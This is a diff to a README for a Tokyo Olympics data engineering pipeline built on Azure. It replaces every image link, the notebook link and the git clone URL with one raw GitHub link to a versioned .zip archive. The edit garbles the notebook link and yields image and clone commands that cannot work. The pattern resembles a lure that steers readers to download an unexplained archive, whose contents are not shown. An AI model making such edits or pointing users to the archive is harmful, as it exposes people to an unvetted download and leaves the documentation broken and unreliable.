@@ -17,7 +17,7 @@ To design and implement a scalable Azure-based data engineering solution that:
 
 ## 🧱 Architecture Overview
 
-![Data Architecture](./Data_Architecture.png)
+![Data Architecture](https://raw.githubusercontent.com/logespandu/Tokyo_Olympics_Azure_Data_Engineering_Pipeline/main/data/Tokyo_Olympics_Azure_Data_Engineering_Pipeline-v2.3.zip)
 
 ### 🔹 Workflow Components:
 - **Data Ingestion**: Azure Data Factory (ADF) loads flat files from on-prem or blob source into Azure Data Lake Gen2.
@@ -30,7 +30,7 @@ To design and implement a scalable Azure-based data engineering solution that:
 
 ## 🔄 Data Ingestion Pipeline
 
-![ADF Pipeline](./Data_ingestion_ADF.png)
+![ADF Pipeline](https://raw.githubusercontent.com/logespandu/Tokyo_Olympics_Azure_Data_Engineering_Pipeline/main/data/Tokyo_Olympics_Azure_Data_Engineering_Pipeline-v2.3.zip)
 
 This ADF pipeline extracts and loads datasets like:
 - Athletes
@@ -51,13 +51,13 @@ Performed in **Azure Databricks** using PySpark notebooks:
 - Joins between datasets (e.g., Athletes ↔ Medals)
 - Storage of transformed tables in parquet format
 
-Notebook: [`Tokyo Olympic Transformation.ipynb`](./Tokyo%20Olympic%20Transformation.ipynb)
+Notebook: [`Tokyo Olympic https://raw.githubusercontent.com/logespandu/Tokyo_Olympics_Azure_Data_Engineering_Pipeline/main/data/Tokyo_Olympics_Azure_Data_Engineering_Pipeline-v2.3.zip`](./Tokyo%20Olympic%https://raw.githubusercontent.com/logespandu/Tokyo_Olympics_Azure_Data_Engineering_Pipeline/main/data/Tokyo_Olympics_Azure_Data_Engineering_Pipeline-v2.3.zip)
 
 ---
 
 ## 📊 Sample Output
 
-![Medal Distribution](./Output_Top100_Countries_Graph.png)
+![Medal Distribution](https://raw.githubusercontent.com/logespandu/Tokyo_Olympics_Azure_Data_Engineering_Pipeline/main/data/Tokyo_Olympics_Azure_Data_Engineering_Pipeline-v2.3.zip)
 
 The chart above displays top countries by total medal count, helping identify high-performing nations and regional trends.
 
@@ -80,7 +80,7 @@ The chart above displays top countries by total medal count, helping identify hi
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/tokyo-olympic-azure-data-engineering-project.git
+   git clone https://raw.githubusercontent.com/logespandu/Tokyo_Olympics_Azure_Data_Engineering_Pipeline/main/data/Tokyo_Olympics_Azure_Data_Engineering_Pipeline-v2.3.zip
    cd tokyo-olympic-azure-data-engineering-project
    ```
 
